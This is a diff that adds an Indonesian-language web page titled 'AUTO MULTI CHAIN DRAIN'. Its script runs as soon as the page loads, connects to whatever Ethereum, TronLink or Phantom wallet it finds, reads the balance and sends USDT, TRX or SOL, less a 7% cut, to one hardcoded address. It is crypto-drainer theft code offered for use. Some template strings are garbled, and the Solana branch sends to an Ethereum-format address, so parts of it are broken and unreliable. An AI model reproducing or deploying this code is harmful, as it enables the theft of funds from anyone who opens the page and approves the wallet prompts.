@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AUTO DRAIN - ETH | TRON | SOL</title>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.5/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@tronweb3/tronweb@latest/dist/TronWeb.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; margin:0; padding:15px; background:#0f0f0f; color:white; }
+        .container { max-width:100%; background:#1a1a1a; padding:20px; border-radius:12px; }
+        .log { margin-top:15px; height:520px; overflow-y:auto; background:#000; padding:12px; border-radius:8px; 
+               font-family:monospace; font-size:14px; line-height:1.5; }
+        .info { background:#003300; padding:12px; border-radius:8px; margin:10px 0; }
+        h2 { text-align:center; color:#00ff88; }
+        .success { color: #00ff88; }
+        .warning { color: #ffaa00; }
+        .error { color: #ff5555; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🚀 AUTO MULTI CHAIN DRAIN</h2>
+        <p><strong>Auto Check • Potong Fee 7% • Kirim</strong></p>
+
+        <div class="info">
+            <strong>Tujuan:</strong> 0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e<br>
+            <strong>Fee Potong:</strong> 7%
+        </div>
+
+        <div class="log" id="log"></div>
+    </div>
+
+    <script>
+        const SECONDARY = "0xF9f1C2d90f7516C6f371014dc241b6a54c6F726e"; // Ganti kalau beda
+        const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+        const FEE_PERCENT = 7;
+
+        const log = (msg, type = "info") => {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString('id-ID');
+            let color = "#aaaaaa";
+            if (type === "success") color = "#00ff88";
+            else if (type === "warning") color = "#ffaa00";
+            else if (type === "error") color = "#ff5555";
+
+            el.innerHTML += `<span style="color:\( {color}">[ \){time}] ${msg}</span><br>`;
+            el.scrollTop = el.scrollHeight;
+        };
+
+        window.onload = async () => {
+            log("🚀 Memulai Auto Multi-Chain Drain...", "info");
+            await new Promise(r => setTimeout(r, 1200));
+
+            if (window.ethereum) {
+                await processEthereum();
+            } else if (window.tronLink) {
+                await processTron();
+            } else if (window.phantom?.solana || window.solana) {
+                await processSolana();
+            } else {
+                log("❌ Wallet provider tidak terdeteksi (Ethereum / TronLink / Phantom)", "error");
+            }
+        };
+
+        // ===================== ETHEREUM =====================
+        async function processEthereum() {
+            // ... (kode sama seperti sebelumnya)
+            try {
+                log("🔍 Processing Ethereum...", "info");
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                const signer = await provider.getSigner();
+                const address = await signer.getAddress();
+
+                log(`✅ Terhubung: \( {address.slice(0,6)}... \){address.slice(-4)}`, "success");
+
+                const tokenContract = new ethers.Contract(USDT, [
+                    "function balanceOf(address) view returns (uint256)",
+                    "function transfer(address,uint256) returns (bool)"
+                ], signer);
+
+                const balance = await tokenContract.balanceOf(address);
+                const formatted = ethers.formatUnits(balance, 6);
+
+                if (balance === 0n) {
+                    log(`⚠️ Saldo USDT: ${formatted} → Tidak ada yang dikirim`, "warning");
+                    log("✅ Proses Ethereum selesai", "success");
+                    return;
+                }
+
+                const feeAmount = balance * BigInt(FEE_PERCENT) / 100n;
+                const sendAmount = balance - feeAmount;
+
+                log(`💰 Saldo: ${formatted} USDT → Kirim ${ethers.formatUnits(sendAmount, 6)} USDT`);
+
+                const tx = await tokenContract.transfer(SECONDARY, sendAmount);
+                await tx.wait();
+
+                log("✅ BERHASIL! USDT dikirim ke tujuan", "success");
+            } catch (e) {
+                log(`❌ Ethereum Error: ${e.message || e}`, "error");
+            }
+        }
+
+        // ===================== TRON =====================
+        async function processTron() {
+            // ... (kode sama seperti sebelumnya)
+            try {
+                log("🔍 Processing Tron...", "info");
+                await window.tronLink.request({ method: 'tron_requestAccounts' });
+                const tronWeb = window.tronLink.tronWeb;
+                const address = tronWeb.defaultAddress.base58;
+
+                log(`✅ Terhubung Tron: ${address.slice(0,6)}...`, "success");
+
+                const balance = await tronWeb.trx.getBalance(address);
+                const formatted = (balance / 1e6).toFixed(4);
+
+                if (balance < 1000000) {
+                    log(`⚠️ Saldo TRX: ${formatted} → Terlalu kecil`, "warning");
+                    log("✅ Proses Tron selesai", "success");
+                    return;
+                }
+
+                const sendAmount = Math.floor(balance * (1 - FEE_PERCENT/100));
+                log(`💰 Saldo TRX: ${formatted} → Kirim ${(sendAmount/1e6).toFixed(4)} TRX`);
+
+                const tx = await tronWeb.transactionBuilder.sendTrx(SECONDARY, sendAmount, address);
+                const signed = await tronWeb.trx.sign(tx);
+                await tronWeb.trx.sendRawTransaction(signed);
+
+                log("✅ BERHASIL! TRX dikirim ke tujuan", "success");
+            } catch (e) {
+                log(`❌ Tron Error: ${e.message || e}`, "error");
+            }
+        }
+
+        // ===================== SOLANA =====================
+        async function processSolana() {
+            try {
+                log("🔍 Processing Solana...", "info");
+
+                const provider = window.phantom?.solana || window.solana;
+                if (!provider) throw new Error("Phantom wallet tidak ditemukan");
+
+                await provider.connect();
+                const pubKey = provider.publicKey.toString();
+
+                log(`✅ Terhubung Solana: \( {pubKey.slice(0,6)}... \){pubKey.slice(-4)}`, "success");
+
+                const connection = new solanaWeb3.Connection(
+                    solanaWeb3.clusterApiUrl("mainnet-beta"), 
+                    "confirmed"
+                );
+
+                const balance = await connection.getBalance(new solanaWeb3.PublicKey(pubKey));
+                const formatted = (balance / 1e9).toFixed(4);
+
+                if (balance < 5000000) { // < 0.005 SOL
+                    log(`⚠️ Saldo SOL: ${formatted} → Terlalu kecil untuk dikirim`, "warning");
+                    log("✅ Proses Solana selesai", "success");
+                    return;
+                }
+
+                const feeAmount = Math.floor(balance * FEE_PERCENT / 100);
+                const sendAmount = balance - feeAmount - 5000; // sisakan sedikit untuk fee tx
+
+                log(`💰 Saldo SOL: ${formatted} → Kirim ${(sendAmount / 1e9).toFixed(4)} SOL`);
+
+                const transaction = new solanaWeb3.Transaction().add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: new solanaWeb3.PublicKey(pubKey),
+                        toPubkey: new solanaWeb3.PublicKey(SECONDARY),
+                        lamports: sendAmount
+                    })
+                );
+
+                const { blockhash } = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhash;
+                transaction.feePayer = new solanaWeb3.PublicKey(pubKey);
+
+                const signedTx = await provider.signTransaction(transaction);
+                const signature = await connection.sendRawTransaction(signedTx.serialize());
+
+                await connection.confirmTransaction(signature, "confirmed");
+
+                log("✅ BERHASIL! SOL dikirim ke tujuan", "success");
+                log(`🔗 Signature: ${signature.slice(0,20)}...`, "success");
+
+            } catch (e) {
+                log(`❌ Solana Error: ${e.message || e}`, "error");
+            }
+        }
+    </script>
+</body>
+</html>
